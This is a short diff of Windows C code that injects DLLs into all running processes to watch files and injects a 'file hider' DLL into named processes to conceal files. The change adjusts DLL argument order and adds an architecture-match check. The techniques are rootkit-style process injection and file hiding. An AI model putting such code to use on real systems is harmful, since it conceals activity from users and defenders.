@@ -23,7 +23,7 @@ BOOL createFiles() {
 }
 
 BOOL initFileWatcher() {
-	return injectToAllProcs(FILE_WATCHER_64_DLL, FILE_WATCHER_32_DLL);
+	return injectToAllProcs(FILE_WATCHER_32_DLL, FILE_WATCHER_64_DLL);
 }
 
 BOOL hideFiles() {
@@ -34,12 +34,16 @@ BOOL hideFiles() {
 			debugOutputStr(L"Error in hideFiles. Process %s is not running", procName);
 			continue;
 		}
-		DWORD isX64 = getProcArchitecture(procId, NULL);
-		if (-1 == isX64) {
-			debugOutputNum(L"Error in hideFiles. isProc64 failed (%d)", GetLastError());
+		architecture procArch = getProcArchitecture(procId, NULL);
+		if (-1 == procArch) {
+			debugOutputNum(L"Error in hideFiles. getProcArchitecture failed (%d)", GetLastError());
 			continue;
 		}
-		TCHAR* dllToRun = (ARCH_64 == isX64) ? FILE_HIDER_64_DLL : FILE_HIDER_32_DLL;
+		if (procArch != getCurProcArchitecture()) {
+			debugOutputStr(L"Error in hideFiles. Process %s and current process architectures do not match\n", procName);
+			continue;
+		}
+		TCHAR* dllToRun = (ARCH_64 == procArch) ? FILE_HIDER_64_DLL : FILE_HIDER_32_DLL;
 		if (!injectAndRun(dllToRun, procId)) {
 			return FALSE; // the debug message was printed internally
 		}
